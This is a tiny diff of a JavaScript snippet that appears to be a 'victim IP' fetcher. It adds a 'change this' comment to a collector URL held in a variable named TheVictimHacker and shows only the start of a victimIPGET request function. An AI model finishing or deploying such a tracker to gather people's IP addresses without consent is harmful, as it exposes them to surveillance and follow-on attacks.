@@ -1,5 +1,5 @@
 console.log("Fetcher included! :)")
-let TheVictimHacker = "http://localhost:8080"
+let TheVictimHacker = "http://localhost:8080" //change this
 function victimIPGET()
 {
     var xmlHttp = new XMLHttpRequest();
